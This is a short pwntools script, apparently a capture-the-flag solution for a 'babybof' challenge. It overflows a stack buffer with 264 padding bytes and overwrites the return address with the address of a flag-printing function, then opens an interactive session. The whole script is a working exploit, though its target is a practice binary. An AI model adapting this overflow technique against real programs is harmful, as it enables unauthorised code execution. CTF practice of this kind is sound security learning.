from pwn import *

GET_FLAG = 0x004006e7

r = process("./babybof")
#r = remote('chals20.cybercastors.com', 14425)

r.sendline(b"A" * 264 + p64(GET_FLAG))
r.interactive()


